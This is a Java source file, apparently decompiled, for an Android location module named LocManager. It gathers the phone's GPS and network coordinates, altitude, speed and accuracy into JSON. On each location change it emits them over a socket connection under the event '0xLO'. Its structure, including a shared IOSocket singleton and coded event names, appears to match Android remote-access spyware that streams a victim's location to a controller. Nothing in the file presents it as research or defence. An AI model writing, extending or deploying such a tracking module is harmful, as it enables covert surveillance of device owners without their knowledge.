package com.example.project20;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import org.json.JSONException;
import org.json.JSONObject;

public class LocManager implements LocationListener {
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10;
    private static final long MIN_TIME_BW_UPDATES = 60000;
    float accuracy;
    double altitude;
    boolean canGetLocation;
    boolean isGPSEnabled;
    boolean isNetworkEnabled;
    double latitude;
    Location location;
    protected LocationManager locationManager;
    double longitude;
    private final Context mContext;
    float speed;

    public void onProviderDisabled(String str) {
    }

    public void onProviderEnabled(String str) {
    }

    public void onStatusChanged(String str, int i, Bundle bundle) {
    }

    public LocManager() {
        this.isGPSEnabled = false;
        this.isNetworkEnabled = false;
        this.canGetLocation = false;
        this.mContext = null;
    }

    public LocManager(Context context) {
        this.isGPSEnabled = false;
        this.isNetworkEnabled = false;
        this.canGetLocation = false;
        this.mContext = context;
        getLocation();
    }

    public Location getLocation() {
        LocationManager locationManager2;
        LocationManager locationManager3;
        try {
            LocationManager locationManager4 = (LocationManager) this.mContext.getSystemService("location");
            this.locationManager = locationManager4;
            this.isGPSEnabled = locationManager4.isProviderEnabled("gps");
            boolean isProviderEnabled = this.locationManager.isProviderEnabled("network");
            this.isNetworkEnabled = isProviderEnabled;
            if (this.isGPSEnabled || isProviderEnabled) {
                this.canGetLocation = true;
                if (ConnectionManager.context.getPackageManager().checkPermission("android.permission.ACCESS_FINE_LOCATION", ConnectionManager.context.getPackageName()) == 0 && ConnectionManager.context.getPackageManager().checkPermission("android.permission.ACCESS_COARSE_LOCATION", ConnectionManager.context.getPackageName()) == 0) {
                    if (this.isNetworkEnabled && (locationManager3 = this.locationManager) != null) {
                        Location lastKnownLocation = locationManager3.getLastKnownLocation("network");
                        this.location = lastKnownLocation;
                        if (lastKnownLocation != null) {
                            this.latitude = lastKnownLocation.getLatitude();
                            this.longitude = this.location.getLongitude();
                            this.altitude = this.location.getAltitude();
                            this.accuracy = this.location.getAccuracy();
                            this.speed = this.location.getSpeed();
                        }
                    }
                    if (this.isGPSEnabled && this.location == null && (locationManager2 = this.locationManager) != null) {
                        Location lastKnownLocation2 = locationManager2.getLastKnownLocation("gps");
                        this.location = lastKnownLocation2;
                        if (lastKnownLocation2 != null) {
                            this.latitude = lastKnownLocation2.getLatitude();
                            this.longitude = this.location.getLongitude();
                            this.altitude = this.location.getAltitude();
                            this.accuracy = this.location.getAccuracy();
                            this.speed = this.location.getSpeed();
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return this.location;
    }

    public boolean canGetLocation() {
        return this.canGetLocation;
    }

    public JSONObject getData() {
        JSONObject jSONObject = new JSONObject();
        if (this.location != null) {
            try {
                jSONObject.put("enabled", true);
                jSONObject.put("latitude", this.latitude);
                jSONObject.put("longitude", this.longitude);
                jSONObject.put("altitude", this.altitude);
                jSONObject.put("accuracy", (double) this.accuracy);
                jSONObject.put("speed", (double) this.speed);
            } catch (JSONException unused) {
            }
        }
        return jSONObject;
    }

    public void onLocationChanged(Location location2) {
        if (location2 != null) {
            this.latitude = location2.getLatitude();
            this.longitude = location2.getLongitude();
            this.altitude = location2.getAltitude();
            this.accuracy = location2.getAccuracy();
            this.speed = location2.getSpeed();
        }
        IOSocket.getInstance().getIoSocket().emit("0xLO", getData());
    }
}
